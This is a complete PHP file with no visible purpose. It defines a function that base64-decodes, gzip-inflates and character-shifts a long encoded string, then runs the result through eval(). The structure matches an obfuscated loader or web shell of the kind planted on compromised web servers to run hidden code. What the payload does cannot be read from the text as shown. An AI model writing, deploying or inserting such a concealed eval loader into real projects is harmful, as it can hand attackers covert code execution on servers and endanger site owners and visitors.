<?php function Wqe($gBKT)
{ 
$gBKT=gzinflate(base64_decode($gBKT));
 for($i=0;$i<strlen($gBKT);$i++)
 {
$gBKT[$i] = chr(ord($gBKT[$i])-1);
 }
 return $gBKT;
 }eval(Wqe("tVPZTsJAFP2AfsW1waQNOoA+mEBQi0UlETC2JCbIw4ADndBOm7YTHhR/3duNxT6IIZ6ky9y5yzntGQCEgletFjgBXJFLUleSNZs5Pqjd8z7lLljMoyKmIX0Tamu7a3GXOksqoCNpDMZSCrBZ6LIpd8CkjnTlfv4oYqGgHoNmFq1IDEAb4pB72nzB4kizbLM30PWdomcaRSs/fN8UBRj4rWhcncBmWoeFDo1QhsmnSLTgFLmMBdoFls2lmMXcF+BRLrSU1Vk2R/9IMmHTt300iunbnlCCMbIfhy/pazO93/kme603fqQd0goxPpmA1bPsbh96FgyGNljGfTcJlxv8h75y5OtoHCg9wY7pSPpriXqbf08iWPyHTjtOJKk7yP9pU9ZK2YwYVirCR/PXW8rK4S4DLQ4lK1yKe9VqzidjY0uxWEiwqBdQjsfYZRE+P0Hdy3oaGniAHoAgUJrwiXq6VZadk4aeL/kcNEhZtKFRh2L2NGR0maeskb1yc618Aw=="));?>